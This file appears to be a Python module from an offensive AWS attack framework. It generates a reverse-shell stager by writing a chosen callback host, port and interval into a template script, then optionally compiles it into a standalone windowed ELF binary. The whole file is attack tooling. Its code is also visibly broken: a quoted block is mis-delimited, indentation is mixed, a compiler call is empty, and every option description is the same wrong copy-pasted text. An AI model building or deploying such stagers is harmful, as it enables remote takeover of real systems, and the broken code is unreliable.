from termcolor import colored
import os
import PyInstaller.__main__
import nuitka.__main__

author = {
    "name": "gl4ssesbo1",
    "twitter": "https://twitter.com/gl4ssesbo1",
    "github": "https://github.com/gl4ssesbo1",
    "blog": "https://www.pepperclipp.com/"
}

needs_creds = False

variables = {
    "SERVICE": {
        "value": "none",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "HOST": {
        "value": "",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "PORT": {
        "value": "",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "FORMAT": {
        "value": "",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "CALLBACK-TIME": {
        "value": "",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "OBFUSCATED": {
        "value": "False",
        "required": "false",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "OUTPUT-FILE-NAME": {
        "value": "",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    }
}
description = "Description of your Module"

aws_command = "aws ec2 describe-launch-templates --region {} --profile {}"


def python_code_generate(host, port, seconds, outfile, dest):
    input_file = open("./module/stager/__revshell/aws_python_tcp.py", 'r')

    output_file = open(dest, 'w')

    lines = input_file.readlines()

    lines[12] = "HOST = '" + host + "'" + "\n"
    lines[13] = "PORT = " + port + "\n"
    lines[14] = "SECONDS = " + seconds + "\n"

    output_file.writelines(lines)

    input_file.close()
    output_file.close()


def exploit(workspace):
    outputfile = variables['OUTPUT-FILE-NAME']['value']
    host = variables['HOST']['value']
    port = variables['PORT']['value']

    seco = variables['CALLBACK-TIME']['value']

    test = True

    try:
        int(seco)
        seconds = seco

    except ValueError:
        if seco == 'None':
            seconds = seco
        else:
            print(
                colored("[*] The CALLBACK-TIME should either be a number or 'None'.", "red")
            )
            test = False

    if test:
        dest = "./workspaces/{}/{}/{}.py".format(workspace, outputfile, outputfile)
        dir = "./workspaces/{}/{}".format(workspace, outputfile)
        if not os.path.exists(dir):
            os.mkdir(dir)

        format = variables['FORMAT']['value']
        python_code_generate(host, port, seconds, outputfile, dest)

        if format == 'py':
            print(colored("[*] Stager saved on file '{}'.".format(dest), "yellow"))

        if format == 'elf':
            distdir = "{}/dist".format(dir)
            builddir = "{}/build".format(dir)
            nuitka.__main__.main(

            )
            ''
			PyInstaller.__main__.run(
				[
					'--distpath',
					distdir,
					'--workpath',
					builddir,
					'--onefile',
					'--windowed',
					dest
				]
			)
			'''
            print(colored("[*] Stager saved on file '{}'.".format(distdir), "yellow"))
